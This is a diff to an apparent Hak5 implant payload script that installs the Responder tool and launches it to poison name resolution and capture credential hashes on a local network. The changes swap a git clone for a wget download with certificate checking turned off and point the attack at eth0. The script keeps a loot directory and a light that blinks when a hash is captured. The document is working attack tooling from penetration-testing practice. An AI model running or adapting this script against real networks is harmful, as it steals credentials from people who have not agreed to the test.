@@ -51,9 +51,14 @@ The LAN Turtle is currently offline.\nPlease connect the LAN Turtle to the Inter
 # Install dependencies
 opkg update | dialog --progressbox "Updating opkg" 14 72 
 
-if [[ ! $(opkg list-installed | grep git) ]];
+#if [[ ! $(opkg list-installed | grep git) ]];
+#  then
+#    opkg install git | dialog --progressbox "Installing dependency git" 14 72
+#fi
+
+if [[ ! $(opkg list-installed | grep unzip) ]];
   then
-    opkg install git | dialog --progressbox "Installing dependency git" 14 72
+    opkg install unzip | dialog --progressbox "Installing dependency unzip" 14 72
 fi
 
 if [[ ! $(opkg list-installed | grep python-sqlite3) ]];
@@ -79,8 +84,14 @@ fi
 if [[ ! -d /etc/turtle/Responder || ! -s /etc/turtle/Responder/Responder.py ]];
 then
   rm -rf /etc/turtle/Responder
-  git clone git://github.com/lgandx/responder /etc/turtle/Responder -q | dialog --progressbox "Installing dependency responder" 14 72
-  rm -rf /etc/turtle/Responder/.git
+  #git clone git://github.com/lgandx/responder /etc/turtle/Responder -q | dialog --progressbox "Installing dependency responder" 14 72
+  #rm -rf /etc/turtle/Responder/.git
+  # https://forums.hak5.org/topic/40815-no-space-left-on-device/
+  # thanks "gon"
+  wget -q -O /tmp/responder.zip --no-check-certificate https://github.com/lgandx/responder/archive/master.zip | dialog --progressbox "Installing dependency responder" 14 72
+  unzip -x /tmp/responder.zip -d /etc/turtle/ -x *.exe | dialog --progressbox "Unpacking dependency responder" 14 72
+  mv /etc/turtle/Responder-master/ /etc/turtle/Responder | dialog --progressbox "Finishing dependency responder" 14 72
+  rm /tmp/responder.zip
 fi
 
 # Setup loot directory and complete setup
@@ -123,7 +134,8 @@ ln -s /root/loot/$((dircount)) /etc/turtle/Responder/logs
 /etc/init.d/dnsmasq stop 1&> /dev/null
 
 # Execute attack
-screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -w -r -d -P'
+#screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I br-lan -w -r -d -P'
+screen -dmS responder bash -c 'cd /etc/turtle/Responder; python Responder.py -I eth0 -w -r -d -P'
 
 # Blink upon hash capture
 while true; do
